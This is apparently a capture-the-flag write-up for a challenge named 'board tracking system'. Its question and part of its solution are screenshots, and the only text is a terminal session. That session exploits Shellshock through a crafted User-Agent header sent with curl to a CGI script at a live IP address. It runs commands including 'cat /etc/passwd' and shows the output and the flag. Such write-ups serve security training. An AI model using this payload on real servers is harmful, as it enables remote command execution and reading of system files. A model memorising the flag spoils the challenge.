
# board tracking system

### Question

<img width="491" alt="Screen Shot 2019-03-09 at 11 39 10 AM" src="https://user-images.githubusercontent.com/14992494/54065983-2a46f680-4263-11e9-9fa2-c22a2da67b96.png">

### Solution

<img width="883" alt="Screen Shot 2019-03-09 at 11 40 33 AM" src="https://user-images.githubusercontent.com/14992494/54065984-2a46f680-4263-11e9-8b80-fe8e909522ed.png">
<img width="658" alt="Screen Shot 2019-03-09 at 11 40 57 AM" src="https://user-images.githubusercontent.com/14992494/54065985-2adf8d00-4263-11e9-87f4-1598ff27f867.png">

```
eloiui-MacBookPro:Downloads eloi$ curl -H "user-agent: () { :; }; echo; /bin/bash -c 'ls -al'" http://81.23.11.159:8080/cgi-bin/stats/
total 12
drwxr-xr-x  2 root     root     4096 Mar  8 10:14 .
drwxr-xr-x 29 root     root     4096 Mar  8 10:14 ..
-rwxr--r--  1 www-data www-data  277 Mar  8 20:59 stats

eloiui-MacBookPro:Downloads eloi$ curl -H "user-agent: () { :; }; echo; /bin/bash -c 'pwd'" http://81.23.11.159:8080/cgi-bin/stats/
/usr/lib/cgi-bin

eloiui-MacBookPro:Downloads eloi$ curl -H "user-agent: () { :; }; echo; /bin/bash -c 'cat /etc/passwd'" http://81.23.11.159:8080/cgi-bin/stats/
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Aero{c58b51bee681ba3aa3971cef7aa26696}
```

### Flag

Aero{c58b51bee681ba3aa3971cef7aa26696}

